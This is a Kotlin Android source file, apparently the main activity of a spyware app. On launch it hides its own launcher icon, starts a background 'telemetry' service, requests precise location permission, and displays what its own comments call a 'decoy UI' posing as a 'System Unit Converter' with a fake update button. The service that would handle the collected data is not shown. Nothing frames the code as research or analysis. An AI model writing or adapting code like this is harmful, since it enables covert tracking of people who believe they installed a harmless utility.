package com.example.telemetry

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.telemetry.sync.InstantTelemetryService

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Hide icon from launcher dynamically
        val componentName = ComponentName(this, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )

        // Launch background telemetry service
        try {
            val serviceIntent = Intent(this, InstantTelemetryService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }

        // Check permissions
        val fineLoc = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        if (!fineLoc) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION),
                1001
            )
        }

        // Render harmless Decoy UI (Unit Converter preview)
        setContentView(createDecoyLayout())
    }

    private fun createDecoyLayout(): View {
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(50, 100, 50, 50)
            gravity = Gravity.CENTER_HORIZONTAL
        }

        val title = TextView(this).apply {
            text = "System Unit Converter"
            textSize = 22f
            setPadding(0, 0, 0, 40)
        }

        val statusText = TextView(this).apply {
            text = "Status: Up to date (v1.0)"
            textSize = 14f
        }

        val btn = Button(this).apply {
            text = "Check for Updates"
            setOnClickListener {
                statusText.text = "System is running latest version."
            }
        }

        layout.addView(title)
        layout.addView(statusText)
        layout.addView(btn)
        return layout
    }
}
